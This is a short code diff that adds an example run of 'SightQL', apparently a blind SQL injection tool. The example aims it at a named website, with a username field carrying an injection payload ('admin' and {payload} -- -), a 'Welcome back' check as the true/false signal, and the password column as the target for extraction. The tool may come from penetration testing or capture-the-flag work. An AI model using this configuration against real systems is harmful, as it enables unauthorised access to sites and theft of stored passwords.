@@ -126,3 +126,20 @@ class SightQL:
                 time.sleep(self.sleep)
 
         s.success(f"Data found: {self.data_exfil}")
+
+
+def predicate(r:requests.models.Response) -> bool:
+    """
+    The predicates must take a requests response and return a bool
+    """
+    return "Welcome back" in r.text
+
+s = SightQL(
+    target="https://0xhorizon.eu",
+    params={
+        "username":"admin' and {payload} -- -",
+        "password":"foo"
+    },
+    column_to_exfil="password",
+    predicate=predicate
+)
